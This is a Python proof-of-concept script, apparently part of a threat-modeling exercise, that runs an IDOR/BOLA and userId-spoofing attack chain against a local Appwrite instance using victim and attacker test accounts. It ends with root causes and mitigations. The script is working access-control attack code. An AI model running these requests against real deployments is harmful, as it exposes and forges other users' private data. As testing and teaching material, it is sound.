"""
=============================================================================
Appwrite IDOR / BOLA Proof of Concept Demo
Step 5: Threat Modeling — Role Confusion (IDOR/BOLA)

PURPOSE:
  This script demonstrates the IDOR (Insecure Direct Object Reference)
  vulnerability in Appwrite's document endpoint. It shows how a user
  with a valid session can access documents that belong to other users
  if collection-level permissions are misconfigured.

  This is a DEMONSTRATION ONLY — run against your own local Appwrite
  instance for educational purposes.

DISCLAIMER:
  Do NOT use this against any system you don't own or have explicit
  permission to test. Unauthorized access is illegal.

SETUP:
  1. Install a local Appwrite instance (Docker)
  2. Create two users: victim@test.com and attacker@test.com
  3. Create a database, collection with "users" read permission
  4. Create a document as victim user
  5. Run this script as attacker user to demonstrate IDOR
=============================================================================
"""

import requests
import json

# ─────────────────────────────────────────────
# CONFIGURATION — Update these values
# ─────────────────────────────────────────────
APPWRITE_ENDPOINT = "http://localhost/v1"
PROJECT_ID        = "your-project-id"
DATABASE_ID       = "your-database-id"
COLLECTION_ID     = "your-collection-id"

VICTIM_EMAIL      = "victim@test.com"
VICTIM_PASSWORD   = "password123"
ATTACKER_EMAIL    = "attacker@test.com"
ATTACKER_PASSWORD = "password123"

# ─────────────────────────────────────────────
# HELPER: Create session and return cookie
# ─────────────────────────────────────────────
def login(email: str, password: str) -> str:
    url = f"{APPWRITE_ENDPOINT}/account/sessions/email"
    headers = {
        "Content-Type": "application/json",
        "X-Appwrite-Project": PROJECT_ID
    }
    payload = {"email": email, "password": password}

    resp = requests.post(url, headers=headers, json=payload)
    if resp.status_code != 201:
        print(f"[ERROR] Login failed for {email}: {resp.text}")
        return None

    cookie = resp.headers.get("set-cookie", "")
    session_id = resp.json().get("$id")
    print(f"[+] Logged in as {email} | Session: {session_id}")
    return cookie

# ─────────────────────────────────────────────
# STEP 1: Victim creates a document
# ─────────────────────────────────────────────
def victim_create_document(session_cookie: str) -> str:
    url = f"{APPWRITE_ENDPOINT}/databases/{DATABASE_ID}/collections/{COLLECTION_ID}/documents"
    headers = {
        "Content-Type": "application/json",
        "X-Appwrite-Project": PROJECT_ID,
        "Cookie": session_cookie
    }
    payload = {
        "documentId": "unique()",
        "data": {
            "secret_data": "Victim's private invoice — $50,000 payment to ACME Corp",
            "owner_email": VICTIM_EMAIL
        },
        "permissions": []  # No explicit permissions set = default collection perms apply
    }

    resp = requests.post(url, headers=headers, json=payload)
    if resp.status_code != 201:
        print(f"[ERROR] Document creation failed: {resp.text}")
        return None

    doc_id = resp.json().get("$id")
    print(f"[+] Victim created document with ID: {doc_id}")
    print(f"    Data: {resp.json().get('data')}")
    return doc_id

# ─────────────────────────────────────────────
# STEP 2: Attacker lists all documents
# Demonstrates BOLA — listing other users' resources
# ─────────────────────────────────────────────
def attacker_list_documents(session_cookie: str):
    url = f"{APPWRITE_ENDPOINT}/databases/{DATABASE_ID}/collections/{COLLECTION_ID}/documents"
    headers = {
        "X-Appwrite-Project": PROJECT_ID,
        "Cookie": session_cookie
    }

    resp = requests.get(url, headers=headers)
    if resp.status_code == 200:
        docs = resp.json().get("documents", [])
        print(f"\n[!] BOLA ATTACK — Attacker can see ALL documents in collection:")
        print(f"    Total documents visible: {len(docs)}")
        for doc in docs:
            print(f"    Document ID: {doc['$id']}")
            print(f"    Data: {json.dumps(doc.get('data', {}), indent=6)}")
    else:
        print(f"[PROTECTED] List documents blocked: {resp.status_code}")

# ─────────────────────────────────────────────
# STEP 3: Attacker accesses specific document by ID
# Demonstrates IDOR — direct object reference
# ─────────────────────────────────────────────
def attacker_access_document(session_cookie: str, doc_id: str):
    url = f"{APPWRITE_ENDPOINT}/databases/{DATABASE_ID}/collections/{COLLECTION_ID}/documents/{doc_id}"
    headers = {
        "X-Appwrite-Project": PROJECT_ID,
        "Cookie": session_cookie
    }

    resp = requests.get(url, headers=headers)
    if resp.status_code == 200:
        print(f"\n[!] IDOR ATTACK SUCCESSFUL — Attacker accessed victim's document!")
        print(f"    Document ID: {doc_id}")
        print(f"    Sensitive data exposed: {json.dumps(resp.json().get('data', {}), indent=4)}")
    else:
        print(f"\n[PROTECTED] IDOR blocked: HTTP {resp.status_code}")
        print(f"    Response: {resp.text}")

# ─────────────────────────────────────────────
# STEP 4: userId Spoofing Demo
# Demonstrates client-side userId field manipulation
# ─────────────────────────────────────────────
def attacker_spoof_userid(session_cookie: str, victim_user_id: str):
    url = f"{APPWRITE_ENDPOINT}/databases/{DATABASE_ID}/collections/{COLLECTION_ID}/documents"
    headers = {
        "Content-Type": "application/json",
        "X-Appwrite-Project": PROJECT_ID,
        "Cookie": session_cookie
    }
    # Attacker creates a document with victim's userId in the data field
    # Appwrite does NOT validate that this matches the authenticated user
    payload = {
        "documentId": "unique()",
        "data": {
            "owner_id": victim_user_id,   # <-- Spoofed to victim's ID
            "message": "Document created by attacker but attributed to victim"
        },
        "permissions": [f"read(\"user:{victim_user_id}\")"]
    }

    resp = requests.post(url, headers=headers, json=payload)
    if resp.status_code == 201:
        print(f"\n[!] userId SPOOFING SUCCESSFUL — Document created under victim's name!")
        print(f"    Document: {resp.json().get('$id')}")
        print(f"    Attributed to userId: {victim_user_id}")
    else:
        print(f"\n[PROTECTED] userId spoofing blocked: {resp.status_code}")

# ─────────────────────────────────────────────
# MAIN: Run full IDOR/BOLA attack chain
# ─────────────────────────────────────────────
def main():
    print("=" * 60)
    print("  Appwrite IDOR / BOLA Demonstration")
    print("  Educational Use Only")
    print("=" * 60)

    # Step 1: Both users log in
    print("\n[*] Step 1: User Authentication")
    victim_cookie   = login(VICTIM_EMAIL, VICTIM_PASSWORD)
    attacker_cookie = login(ATTACKER_EMAIL, ATTACKER_PASSWORD)

    if not victim_cookie or not attacker_cookie:
        print("[ERROR] Login failed. Check credentials and endpoint.")
        return

    # Step 2: Victim creates a private document
    print("\n[*] Step 2: Victim creates a private document")
    doc_id = victim_create_document(victim_cookie)

    if not doc_id:
        print("[ERROR] Document creation failed.")
        return

    # Step 3: Attacker lists all documents (BOLA)
    print("\n[*] Step 3: Attacker attempts to list all documents (BOLA)")
    attacker_list_documents(attacker_cookie)

    # Step 4: Attacker accesses victim's document directly (IDOR)
    print("\n[*] Step 4: Attacker accesses victim's document by ID (IDOR)")
    attacker_access_document(attacker_cookie, doc_id)

    print("\n[*] Step 5: Attacker creates document attributed to victim (userId spoofing)")
    attacker_spoof_userid(attacker_cookie, "victim-user-id-here")

    # Summary
    print("\n" + "=" * 60)
    print("  ATTACK SUMMARY")
    print("=" * 60)
    print("""
  Vulnerabilities Demonstrated:
  ┌────────────────────────────────────────────────────────┐
  │ 1. BOLA: Attacker lists all documents in collection    │
  │    → Root cause: Collection permission set to 'users'  │
  │    → Fix: Use document-level permissions               │
  │                                                        │
  │ 2. IDOR: Attacker accesses document by guessing ID     │
  │    → Root cause: No ownership check on document read   │
  │    → Fix: Restrict read to creator only                │
  │                                                        │
  │ 3. userId Spoofing: Attacker fakes document ownership  │
  │    → Root cause: No server-side userId validation      │
  │    → Fix: Validate userId in Appwrite Function         │
  └────────────────────────────────────────────────────────┘

  Mitigations:
  - Set explicit permissions per document, not collection-wide
  - Use Appwrite Functions to validate userId server-side
  - Never trust client-supplied identity fields
  - Rate limit enumeration attempts
    """)

if __name__ == "__main__":
    main()